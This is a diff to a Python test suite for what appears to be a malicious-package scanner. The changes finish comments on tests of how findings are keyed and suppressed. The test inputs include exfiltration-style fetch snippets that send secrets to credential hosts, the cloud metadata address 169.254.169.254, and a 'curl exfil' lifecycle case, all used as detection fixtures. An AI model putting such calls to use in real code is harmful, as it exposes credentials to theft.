@@ -329,6 +329,7 @@ def test_baseline_key_is_version_stable():
 
 def test_baseline_key_distinguishes_same_basename_diff_dir():
     # Package-relative keying: the same basename in a different directory is a DIFFERENT key, so a new dist/ vs src/
+    # file is not silently suppressed.
     a = _finding("pkg@1.0.0", "package/dist/index.js", "obfuscated-blob")
     b = _finding("pkg@1.0.0", "package/src/index.js", "obfuscated-blob")
     assert snp._finding_key(a) != snp._finding_key(b)
@@ -451,6 +452,7 @@ def test_js_fetch_eval_payload_tail_reopens_key():
 
 def test_outbound_host_multiline_options_reopen():
     # A large blob's evidence hash binds the full match (via a digest when the snippet is truncated), so changing only
+    # the payload tail reopens the key.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
@@ -524,6 +526,7 @@ def _host_finding(text):
 
 def test_outbound_host_config_long_object_binds_tail():
     # A config object longer than the backward window still binds its tail, so a changed payload line well below the
+    # hostname reopens (not truncated away).
     filler = "\n".join(f"  opt{i}: {i}," for i in range(30))
     obj = (
         "const opts = {\n  hostname: '169.254.169.254',\n"
@@ -537,6 +540,8 @@ def test_outbound_host_config_long_object_binds_tail():
 
 def test_outbound_host_config_far_opener_binds():
     # The enclosing object's opener can sit well above the hostname line (a large options object whose `{` is many
+    # properties back). The backward scan must still reach it so a payload changed on an earlier property of the same
+    # object reopens, not just a change on the hostname line itself.
     above = "\n".join(f"  opt{i}: {i}," for i in range(20))
     obj = (
         "const opts = {\n"
@@ -549,6 +554,7 @@ def test_outbound_host_config_far_opener_binds():
 
 def test_outbound_host_config_forward_cap_measured_from_match():
     # With the opener near the backward-search limit, the forward group cap must be measured from the matched hostname
+    # line, not the opener, so the path that follows the hostname is still bound and a changed payload there reopens.
     above = "\n".join(f"  opt{i}: {i}," for i in range(198))
     obj = (
         "const opts = {\n"
@@ -593,6 +599,7 @@ def test_outbound_host_multiline_template_literal_reopens():
 
 def test_cred_env_lifecycle_binds_whole_body():
     # cred-env-in-lifecycle evidence pins the whole script body, so a changed non-token line (echo safe -> curl exfil)
+    # reopens even with the token line unchanged.
     def life(body):
         pkg = snp.PackageEntry(
             name = "e",
@@ -653,7 +660,8 @@ def test_cred_path_lifecycle_bounds_body_but_reopens():
 
 
 def test_outbound_host_regex_literal_does_not_close_group_early():
-    # A ) inside a JS regex literal must not close the outbound call early; the
+    # A ) inside a JS regex literal must not close the outbound call early; the options object after the regex binds, so
+    # a changed header reopens.
     old = "request('http://169.254.169.254', /)/, {\n  headers: {a: 'old'},\n});\n"
     new = old.replace("old", "evil")
     assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))
@@ -710,6 +718,7 @@ def _ioc_pkg():
 
 def test_known_ioc_evidence_binds_context_not_bare_needle():
     # A known-ioc-string finding keys on the matched-line context, not the bare constant, so a changed adjacent
+    # fetch/exfil body on the same call reopens while the IOC needle stays in place.
     ioc = next(iter(snp.KNOWN_IOC_STRINGS))
     old = f"fetch('http://h/'+'{ioc}', {{body: 'OLD'}})\n"
     new = f"fetch('http://h/'+'{ioc}', {{body: 'EVIL'}})\n"
@@ -726,6 +735,7 @@ def test_known_ioc_evidence_binds_context_not_bare_needle():
 
 def test_always_bad_host_evidence_binds_outbound_context():
     # cred-surface-host (always-bad) binds the outbound call context, so altering the exfil body on the same call
+    # reopens the key instead of riding the bare host literal.
     host = snp.CRED_HOST_ALWAYS_BAD[0][0]
     old = f"fetch('https://{host}/x', {{body: secretOLD}})\n"
     new = f"fetch('https://{host}/x', {{body: secretEVIL}})\n"
@@ -741,7 +751,8 @@ def test_always_bad_host_evidence_binds_outbound_context():
 
 
 def test_outbound_host_config_reindent_is_stable():
-    # A formatter-only reindent of the bound continuation lines must NOT change
+    # A formatter-only reindent of the bound continuation lines must NOT change the key (whitespace is normalized before
+    # the logical-line digest).
     tight = "const opts = {\n  hostname: '169.254.169.254',\n  path: '/x',\n};\nrun(opts);\n"
     loose = (
         "const opts = {\n      hostname: '169.254.169.254',\n      path:    '/x',\n};\nrun(opts);\n"
@@ -823,6 +834,7 @@ def test_legacy_schema_baseline_is_ignored(tmp_path):
 
 def test_v2_baseline_migrates_by_recomputing_hash(tmp_path):
     # v2 shares v3's package-relative keying, so its entries migrate (the hash is recomputed from stored evidence)
+    # rather than being thrown away, matching the Python loader. An unchanged finding stays suppressed.
     bl = tmp_path / "v2.json"
     evidence = "fetch('http://ok')"
     bl.write_text(
